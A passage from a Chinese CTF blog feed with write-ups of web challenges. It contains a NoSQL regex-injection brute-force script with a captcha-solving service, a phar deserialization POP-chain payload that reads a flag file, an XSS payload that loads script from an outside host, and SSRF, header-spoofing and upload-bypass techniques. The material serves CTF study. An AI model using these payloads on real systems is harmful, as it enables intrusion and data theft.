class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from hashlib import md5</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># swpuCTF验证码爆破</span><br><span class="line"># Manggodb爆破</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^%s&amp;vertify=%s&quot;</span><br><span class="line">url_vertify = &quot;http://123.206.213.66:45678/vertify.php&quot;</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">proxies = &#123;</span><br><span class="line">    &quot;http&quot;: &quot;127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class RClient(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, username, password, soft_id, soft_key):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = md5(password).hexdigest()</span><br><span class="line">        self.soft_id = soft_id</span><br><span class="line">        self.soft_key = soft_key</span><br><span class="line">        self.base_params = &#123;</span><br><span class="line">            &apos;username&apos;: self.username,</span><br><span class="line">            &apos;password&apos;: self.password,</span><br><span class="line">            &apos;softid&apos;: self.soft_id,</span><br><span class="line">            &apos;softkey&apos;: self.soft_key,</span><br><span class="line">        &#125;</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            &apos;Connection&apos;: &apos;Keep-Alive&apos;,</span><br><span class="line">            &apos;Expect&apos;: &apos;100-continue&apos;,</span><br><span class="line">            &apos;User-Agent&apos;: &apos;ben&apos;,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    def rk_create(self, im, im_type, timeout=60):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        im: 图片字节</span><br><span class="line">        im_type: 题目类型</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        params = &#123;</span><br><span class="line">            &apos;typeid&apos;: im_type,</span><br><span class="line">            &apos;timeout&apos;: timeout,</span><br><span class="line">        &#125;</span><br><span class="line">        params.update(self.base_params)</span><br><span class="line">        files = &#123;&apos;image&apos;: (&apos;a.jpg&apos;, im)&#125;</span><br><span class="line">        r = requests.post(&apos;http://api.ruokuai.com/create.json&apos;, data=params, files=files, headers=self.headers)</span><br><span class="line">        return r.json()</span><br><span class="line"></span><br><span class="line">    def rk_report_error(self, im_id):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        im_id:报错题目的ID</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        params = &#123;</span><br><span class="line">            &apos;id&apos;: im_id,</span><br><span class="line">        &#125;</span><br><span class="line">        params.update(self.base_params)</span><br><span class="line">        r = requests.post(&apos;http://api.ruokuai.com/reporterror.json&apos;, data=params, headers=self.headers)</span><br><span class="line">        return r.json()</span><br><span class="line"></span><br><span class="line">def get_time():</span><br><span class="line">    now_time = time.strftime(&quot;%H:%M:%S&quot;, time.localtime())</span><br><span class="line">    return now_time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getvertify():</span><br><span class="line">    res = s.get(url=url_vertify)</span><br><span class="line">    file_name = &apos;1.png&apos;</span><br><span class="line">    with open(file_name, &apos;wb&apos;) as file:</span><br><span class="line">        file.write(res.content)</span><br><span class="line">        file.flush()</span><br><span class="line">    file.close()</span><br><span class="line">    # print(&quot;[+] 图片下载完成，正在进行图片识别&quot;)</span><br><span class="line">    rc = RClient(&apos;username&apos;, &apos;pwd&apos;, &apos;keyid&apos;, &apos;key&apos;)</span><br><span class="line">    im = open(&apos;1.png&apos;, &apos;rb&apos;).read()</span><br><span class="line">    vertify = rc.rk_create(im, 3040)[&apos;Result&apos;]</span><br><span class="line">    print(&quot;[+] 识别成功： %s&quot; % str(vertify))</span><br><span class="line">    return vertify</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getflag():</span><br><span class="line">    global s</span><br><span class="line">    str_base = &quot;sabcdefghijklmnopqrtuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;  # /-+=.~`!@%^*()[]&#123;&#125;|\;:&apos;\&quot;,&lt;&gt;?&quot;</span><br><span class="line">    i = 0</span><br><span class="line">    j = 0</span><br><span class="line">    pwd = &quot;&quot;</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    while i &lt; 30:</span><br><span class="line"></span><br><span class="line">        while j &lt; len(str_base):</span><br><span class="line">            pwd = flag + str_base[j]</span><br><span class="line">            verify = str(getvertify())</span><br><span class="line">            exp = payload % (pwd, verify)</span><br><span class="line">            url = exp</span><br><span class="line">            res = s.get(url, proxies=proxies)</span><br><span class="line">            print(&quot;[*] %s Current payload:%s&quot; % (get_time(), exp))</span><br><span class="line">            if &quot;wrong CAPTCHA&quot; in res.text:</span><br><span class="line">                print(&quot;[-] %s %s&quot; % (get_time(), res.text))</span><br><span class="line">                continue</span><br><span class="line">            elif &quot;username or password incorrect&quot; in res.text:</span><br><span class="line">                print(&quot;[-] %s %s&quot; % (get_time(), res.text))</span><br><span class="line">                j = j+1</span><br><span class="line">            else:</span><br><span class="line">                flag = pwd</span><br><span class="line">                print(&quot;[-] %s %s&quot; % (get_time(), res.text))</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">            #time.sleep(1)</span><br><span class="line">        j=0</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    getflag()</span><br></pre></td></tr></table></figure><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>考点phar反序列化，源码没有unserialize反序列化操作的函数，这是最近blackhat上一个热门议题，phar反序列化。<br>利用点条件：</p><ul><li>能将打包好的phar文件上传(扩展名,文件头都可以伪造)</li><li>存在文件操作函数：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</span><br></pre></td></tr></table></figure></li></ul><p>具体详细介绍看hpdog师傅的文章：<a href="https://www.anquanke.com/post/id/159206#h3-17" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206#h3-17</a></p><p>这个题的攻击链的构造有一点点小复杂。</p><p>先纵观class.php中的三个类：</p><ul><li>C1e4类中的析构函数有一个echo操作</li><li>Show类中有__toString()魔术方法</li><li>show类中的__toString() 中有<code>$this-&gt;str[&#39;str&#39;]-&gt;source;</code>这样一个操作。</li><li>Test类中有__get()魔术方法，调用私有属性，或者不存在的属性时会触发。</li><li>Test类中get()方法会用file_get_contents()读取文件</li><li>file.php中有文件操作的函数:<code>file_exists()</code></li></ul><p>所以思路就是：<br>用Test类中get()读到flag文件，用C1e4类中的echo输出结果。</p><p>而中间的过程即：<br>我们先将三个类分别new一遍。将show的实例化对象赋值给C1e4r类的<code>$str</code>，使得show对象被echo出来，从而调用show类中的<code>__toString</code>方法。然后我们将show方法中的<code>$this-&gt;str[&#39;str&#39;]</code>赋入test对象，这样就会调用test中的source变量，这个变量不存在，所以触发Test类中的<code>__get()</code>魔术方法，其次Test类的<code>$params</code>要赋值成一个数组键为source，值为flag路径。</p><p>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a = new Test();</span><br><span class="line">$a-&gt;params = [</span><br><span class="line">        &apos;source&apos;=&gt; &apos;/var/www/html/f1ag.php&apos;</span><br><span class="line">];</span><br><span class="line">$b = new Show();</span><br><span class="line">$b-&gt;str[&apos;str&apos;] = $a;</span><br><span class="line"></span><br><span class="line">$c = new C1e4r();</span><br><span class="line">$c-&gt;str = $b;</span><br></pre></td></tr></table></figure></p><p>完整payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()  // 类被当成字符串回应的方法</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&apos;str&apos;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)   // 设置一个类的成员变量时调用</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">       if(preg_match(&apos;/http|https|file:|gopher|dict|\.\.|f1ag/i&apos;,$this-&gt;source)) &#123;  // 防ssrf等等？</span><br><span class="line">           die(&apos;hacker!&apos;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()  // 执行unserialize()先调用这个，这里用phar来进行调用</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));   // 读flag:f1ag.php</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Test();</span><br><span class="line">$a-&gt;params = [</span><br><span class="line">        &apos;source&apos;=&gt; &apos;/var/www/html/f1ag.php&apos;</span><br><span class="line">];</span><br><span class="line">$b = new Show();</span><br><span class="line">$b-&gt;str[&apos;str&apos;] = $a;</span><br><span class="line"></span><br><span class="line">$c = new C1e4r();</span><br><span class="line">$c-&gt;str = $b;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;passer6y.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($c);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;Passer6y&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/Passer6y/02n3ai7ifncjhm75hqeb59td/image_1cv5mhh8jf7muc7cm7n7h1os59.png" alt="image_1cv5mhh8jf7muc7cm7n7h1os59.png-98.9kB"></p><h1 id="WEB-4"><a href="#WEB-4" class="headerlink" title="WEB 4"></a>WEB 4</h1><p>玩的时候xssbot挂了.. 这里考察<code>filter_var</code>函数校验绕过<br>payload:<br><code>email=&quot;&lt;script\ src=https://*.exeye.io/swpu&gt;&lt;/script&gt;&quot;@qq.com&amp;submit=</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--check.php</span><br><span class="line">if($_POST[&apos;email&apos;]) &#123;</span><br><span class="line">    $email = $_POST[&apos;email&apos;];</span><br><span class="line">    if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    echo &quot;error email, please check your email&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    echo &quot;等待管理员自动审核&quot;;</span><br><span class="line">    echo $email;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p><img src="http://static.zybuluo.com/Passer6y/oavlsqqbq1ri12ogyjmvb7wj/image_1cv5npon2tlcnm2ajg1thh109826.png" alt="image_1cv5npon2tlcnm2ajg1thh109826.png-108.3kB"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://passer6y.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>安洵杯2018-WebN出题记录</title>
    <link href="http://passer6y.fun/2018/12/01/%E5%AE%89%E6%B4%B5%E6%9D%AF2018-WebN%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://passer6y.fun/2018/12/01/安洵杯2018-WebN出题记录/</id>
    <published>2018-12-01T12:40:00.000Z</published>
    <updated>2019-02-09T11:15:40.024Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h2><p>考点，同源代码执行(Some攻击)，一个jsonp接口，搞不了xss，获取不了信息，但是能回调调用js函数，这样就可以Bypass csrf token了~</p><p>漏洞点：</p><p>礼品中心处：<br><img src="http://static.zybuluo.com/Passer6y/6pgi1em6bjnj3hhytju6fpv0/image_1cs6hv2drb3k1sgfrop6u419699.png" alt="image_1cs6hv2drb3k1sgfrop6u419699.png-251.8KB"><br>怎么购买 怎么充值都是失败的。</p><p>分析js代码：<br><img src="http://static.zybuluo.com/Passer6y/f3k2f9dta43t2l92c89eo713/image_1cs6i2efa1qol641htss81lh7m.png" alt="image_1cs6i2efa1qol641htss81lh7m.png-68kB"><br>在reward.php中点击富萝莉后，会用iframe加载confirm.php的文件</p><p>跟进confirm.php<br>一个jsonp的回调接口，<br><img src="http://static.zybuluo.com/Passer6y/6wvjt5npj3irvtbzujycsgt1/image_1cs6i8oo4b045a2ejo1tb8e9j13.png" alt="image_1cs6i8oo4b045a2ejo1tb8e9j13.png-74.2kB"></p><p>跟进接口jsonp接口，字符实体编码，搞不了反射型xss。<br><img src="http://static.zybuluo.com/Passer6y/rgddrmj5gswmig2qil3jw2u6/image_1cs6ic666kbbvu7pv8e6nknn1g.png" alt="image_1cs6ic666kbbvu7pv8e6nknn1g.png-28.6kB"></p><p>回过头来看reward.php，这里有一个提示：<br><img src="http://static.zybuluo.com/Passer6y/zy1yg7vlswld93b8hpgr47vt/image_1cs6iei2i1n5616081kh1q4fjte1t.png" alt="image_1cs6iei2i1n5616081kh1q4fjte1t.png-416.3kB"></p><p>点击之后，怎么也提示钱不够，而且还有token的验证。<br><img src="http://static.zybuluo.com/Passer6y/ecu76os7ivsy3gplugqadi7o/image_1cs6ihh498mk5o31fmv116o6m2a.png" alt="image_1cs6ihh498mk5o31fmv116o6m2a.png-497.5kB"></p><p>这里思路就很清晰了，csrf 绕token，配合首页的富萝莉客服，让客服点击链接，帮你购买商品<br><img src="http://static.zybuluo.com/Passer6y/79lzpmczxdana511rfjvcnnr/image_1cs6ikkns17jqtba16p41q1j1okn37.png" alt="image_1cs6ikkns17jqtba16p41q1j1okn37.png-346.6kB"><br><img src="http://static.zybuluo.com/Passer6y/zw4bp4f6kfp1xmz5ycrpgign/image_1cs6il75t43efc660pgdbr3k.png" alt="image_1cs6il75t43efc660pgdbr3k.png-94.5kB"></p><p>不难想到，肯定就是some攻击调用reward.php中的pay()函数了<br><img src="http://static.zybuluo.com/Passer6y/2xwdut1c4l4vn7zqq3tzea45/image_1cs6ip4581v9a1hsjvpt1lsb29941.png" alt="image_1cs6ip4581v9a1hsjvpt1lsb29941.png-72.9kB"></p><p>exp:<br><img src="http://static.zybuluo.com/Passer6y/76iioigktfac7rzlp48wz7pf/exp.zip" alt="exp.zip-1.1kB"></p><p>自动测试爬虫：<br><img src="http://static.zybuluo.com/Passer6y/q12i7rtkjemh1h5ee1i2nnq8/1.py" alt="1.py-0.3kB"></p><p>视频demo：<br><img src="http://static.zybuluo.com/Passer6y/34ka4snouxxlrxtsdyf5rtgg/demo.mp4" alt="demo.mp4-2923.9kB"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://passer6y.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>骇极杯Web Writeup</title>
    <link href="http://passer6y.fun/2018/11/07/%E9%AA%87%E6%9E%81%E6%9D%AFWeb%20Writeup/"/>
    <id>http://passer6y.fun/2018/11/07/骇极杯Web Writeup/</id>
    <published>2018-11-07T03:40:00.000Z</published>
    <updated>2018-11-07T03:49:08.000Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><ol><li>web1<br>这题考察ssrf。<br>robots.txt中提示有两个文件：</li></ol><ul><li>source.php</li><li>flag.php<br>显然一个是源码一个是flag。<br><img src="http://static.zybuluo.com/Passer6y/4z1onhhv6pqzfyk97slz67cu/image_1crgs2r4oepqtd0mobg8m540m.png" alt="image_1crgs2r4oepqtd0mobg8m540m.png-89.5kB"></li></ul><p>这里还考察了一个点，php获取ip的绕过，这里x-client-ip即可绕过。<br>![@JMXBRS[UGCT}~}FG<a href="http://static.zybuluo.com/Passer6y/p3cip90469ehrwqlkl0716t4/@JMXBRS%5BUGCT%7D~%7DFG%5B2%60%7D2T.png" target="_blank" rel="noopener">2`}2T.png-69.6kB</a><br>常见的修改http请求头伪造ip的方法有：</p><ul><li>X_FORWARDED_FOR</li><li>Client-IP</li><li>x-client-ip</li></ul><p>然后让我们加上url参数请求i春秋的官网：<br><code>url=http://www.ichunqiu.com</code><br><img src="http://static.zybuluo.com/Passer6y/83281jibgwrz9d75yv7puk0k/image_1crgscmub1fk1elh1kjm2a7183822.png" alt="image_1crgscmub1fk1elh1kjm2a7183822.png-39.5kB"></p><p>而且每次请求都发现文件名在变，然后返回的东西里面还有<code>;</code>号，开始以为是考nginx的解析漏洞。后来一想不可能无缘无故给url参数，可能是指定url，然后把读取到的文件写到图片里面。<br>后来看到sn00py师傅测试<code>url=//www.ichunqiu.com</code>的时候发现，再去访问图片的响应码就变成200了。<br><img src="http://static.zybuluo.com/Passer6y/sth57kuvdrf0r3gljhqtrko1/GQND%28%7D63%294FP0%28DRLZGY6JF.png" alt="GQND(}63)4FP0(DRLZGY6JF.png-29.7kB"></p><p><img src="http://static.zybuluo.com/Passer6y/cpku3avo9x6vozd5qr2m4k2f/image_1crgsp60u133k7motrk52k1l7k1p.png" alt="image_1crgsp60u133k7motrk52k1l7k1p.png-59.3kB"></p><p>然后想到用file协议去绕url限制：<br><img src="http://static.zybuluo.com/Passer6y/dg4u4414k3see92fcpjjbkdu/image_1crgsuoi9b201mb44si144a8or26.png" alt="image_1crgsuoi9b201mb44si144a8or26.png-35.8kB"><br><img src="http://static.zybuluo.com/Passer6y/oujgnaygobr4gpxp34gv7atp/image_1crgsuufhjfs17nn1rclhhfgsf2j.png" alt="image_1crgsuufhjfs17nn1rclhhfgsf2j.png-60.4kB"></p><p>读flag<br><img src="http://static.zybuluo.com/Passer6y/a74p188jii0t48s8tfsxent4/image_1crgt3nbf1l5m1a7115t0mt4ohe30.png" alt="image_1crgt3nbf1l5m1a7115t0mt4ohe30.png-40.3kB"><br><img src="http://static.zybuluo.com/Passer6y/x6dg5lp0t4zvhap3cnr5w5hj/image_1crgt3svt1emu7ra1bnlcv9ule3d.png" alt="image_1crgt3svt1emu7ra1bnlcv9ule3d.png-73.3kB"></p><ol start="2"><li>web2<br>题目源码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //error_reporting(0);</span><br><span class="line">   //$dir=md5(&quot;icq&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">   //$dir=md5(&quot;icq&quot;);</span><br><span class="line">   //$sandbox = &apos;/var/sandbox/&apos; . $dir;</span><br><span class="line">   //@mkdir($sandbox);</span><br><span class="line">   //@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">   if($_FILES[&apos;file&apos;][&apos;name&apos;])&#123;</span><br><span class="line">       $filename = !empty($_POST[&apos;file&apos;]) ? $_POST[&apos;file&apos;] : $_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">       if (!is_array($filename)) &#123;</span><br><span class="line">           $filename = explode(&apos;.&apos;, $filename);</span><br><span class="line">       &#125;</span><br><span class="line">       $ext = end($filename);</span><br><span class="line">       if($ext==$filename[count($filename) - 1])&#123;</span><br><span class="line">           die(&quot;emmmm...&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">       $new_name = (string)rand(100,999).&quot;.&quot;.$ext;</span><br><span class="line">       move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$new_name);</span><br><span class="line">       $_ = $_POST[&apos;hehe&apos;];</span><br><span class="line">       if(@substr(file($_)[0],0,6)===&apos;@&lt;?php&apos; &amp;&amp; strpos($_,$new_name)===false)&#123;</span><br><span class="line">           include($_);</span><br><span class="line">       &#125;</span><br><span class="line">       unlink($new_name);</span><br><span class="line">   &#125;</span><br><span class="line">   else&#123;</span><br><span class="line">       highlight_file(__FILE__);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li></ol><p>上传页，抓包用：<br><img src="http://static.zybuluo.com/Passer6y/93nex2326pfdkuodojqzyg9x/upload.html" alt="upload.html-0.3kB"></p><p>正常解法,先绕<code>end()</code>和<code>$filename[count($filename) - 1]</code>的差异，然后end是取最后一个插入的元素，后者是取索引中的最后一个，然后我们上传的时候给file变量传数组就不会进入explode截断，这样就可以绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($ext==$filename[count($filename) - 1])&#123;</span><br><span class="line">    die(&quot;emmmm...&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接着后面是给文件名重命令三位随机数，并且hehe参数不能包含这个随机重命名的上传文件。<br>这里参考</p><blockquote><p><a href="http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html" target="_blank" rel="noopener">http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html</a></p></blockquote><p>接着可以使用<code>x/../1.php/.</code>进行文件覆盖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POST /file_upload/shanghai/1.php HTTP/1.1</span><br><span class="line">Host: ctf</span><br><span 